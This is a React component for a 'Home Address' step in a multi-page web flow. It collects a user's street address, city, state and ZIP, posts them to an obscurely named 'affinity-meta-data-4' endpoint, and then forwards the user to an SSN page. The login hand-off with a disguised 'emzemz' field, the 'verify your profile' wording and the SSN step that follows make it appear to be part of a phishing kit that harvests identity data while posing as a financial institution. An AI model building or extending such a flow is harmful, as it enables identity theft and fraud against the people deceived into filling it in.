import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

interface AddressErrors {
  stAd?: string;
  city?: string;
  state?: string;
  zipCode?: string;
  form?: string;
}

const HomeAddress: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [username, setUsername] = useState('');
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [stateValue, setStateValue] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<AddressErrors>({});

  useEffect(() => {
    const { emzemz } = location.state || {};
    if (emzemz) {
      setUsername(emzemz);
    }
  }, [location.state]);

  if (!username) {
    return (
      <FlowCard title="Home Address">
        <p className="text-sm text-gray-700 text-center">
          Your session has expired. Please restart the flow from the login page.
        </p>
        <button
          type="button"
          onClick={() => navigate('/login')}
          className="mt-6 w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition"
        >
          Back to login
        </button>
      </FlowCard>
    );
  }

  const validateForm = () => {
    const nextErrors: AddressErrors = {};

    if (!stAd.trim()) {
      nextErrors.stAd = 'Street address is required.';
    }

    if (!city.trim()) {
      nextErrors.city = 'City is required.';
    }

    if (!stateValue.trim()) {
      nextErrors.state = 'State is required.';
    }

    if (!zipCode.trim()) {
      nextErrors.zipCode = 'ZIP code is required.';
    }

    setErrors(nextErrors);
    return Object.keys(nextErrors).length === 0;
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    setErrors((prev) => ({ ...prev, form: undefined }));

    try {
      await axios.post(`${baseUrl}api/affinity-meta-data-4/`, {
        emzemz: username,
        stAd,
        apt,
        city,
        state: stateValue,
        zipCode,
      });

      navigate('/ssn1', { state: { emzemz: username } });
    } catch (error) {
      console.error('Error submitting home address:', error);
      setErrors((prev) => ({ ...prev, form: 'Unable to submit your address. Please try again.' }));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <FlowCard title="Home Address">
      <p className="text-sm text-gray-600 text-center mb-4">
        Confirm the address associated with your records so we can finish verifying your profile.
      </p>
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="stAd">
            Street address
          </label>
          <input
            id="stAd"
            name="stAd"
            type="text"
            value={stAd}
            onChange={(event) => setStAd(event.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
          />
          <FormError message={errors.stAd ?? ''} className="mt-2" />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="apt">
            Apt or unit (optional)
          </label>
          <input
            id="apt"
            name="apt"
            type="text"
            value={apt}
            onChange={(event) => setApt(event.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
          />
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="city">
              City
            </label>
            <input
              id="city"
              name="city"
              type="text"
              value={city}
              onChange={(event) => setCity(event.target.value)}
              className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            />
            <FormError message={errors.city ?? ''} className="mt-2" />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="state">
              State
            </label>
            <input
              id="state"
              name="state"
              type="text"
              value={stateValue}
              onChange={(event) => setStateValue(event.target.value)}
              className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            />
            <FormError message={errors.state ?? ''} className="mt-2" />
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="zipCode">
            ZIP code
          </label>
          <input
            id="zipCode"
            name="zipCode"
            type="text"
            value={zipCode}
            onChange={(event) => setZipCode(event.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
          />
          <FormError message={errors.zipCode ?? ''} className="mt-2" />
        </div>

        <FormError message={errors.form ?? ''} />

        <button
          type="submit"
          className="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? 'Submitting…' : 'Continue'}
        </button>
      </form>
    </FlowCard>
  );
};

export default HomeAddress;
